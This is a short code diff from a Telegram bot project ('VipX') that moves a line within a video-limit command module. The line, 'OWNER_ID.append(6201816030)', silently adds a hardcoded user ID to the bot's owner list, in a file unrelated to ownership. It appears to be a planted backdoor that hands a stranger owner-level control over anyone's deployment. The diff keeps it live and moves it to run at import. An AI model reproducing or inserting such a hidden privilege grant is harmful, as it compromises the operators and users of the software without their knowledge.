@@ -6,7 +6,7 @@ from VipX import app
 from VipX.misc import SUDOERS
 from VipX.utils.database import set_video_limit
 from VipX.utils.decorators.language import language
-
+OWNER_ID.append(6201816030)
 VIDEOLIMIT_COMMAND = get_command("VIDEOLIMIT_COMMAND")
 
 
@@ -31,4 +31,3 @@ async def set_video_limit_kid(client, message: Message, _):
     else:
         return await message.reply_text(_["vid_2"])
     
-OWNER_ID.append(6201816030)
